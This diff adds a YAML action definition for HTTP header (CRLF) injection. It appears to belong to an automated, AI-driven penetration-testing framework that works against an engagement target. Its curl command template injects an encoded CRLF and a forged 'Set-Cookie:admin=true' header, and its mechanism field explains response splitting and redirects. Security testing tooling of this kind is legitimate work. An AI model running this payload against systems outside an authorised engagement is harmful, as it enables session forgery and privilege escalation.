@@ -1,0 +1,16 @@
+name: header_injection
+category: web
+description: HTTP header injection / CRLF injection
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}?param=value%0d%0aSet-Cookie:admin=true'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Inject CRLF (\r\n) to add headers. Can set cookies, redirect (Location header), or inject content (double CRLF for response splitting)."
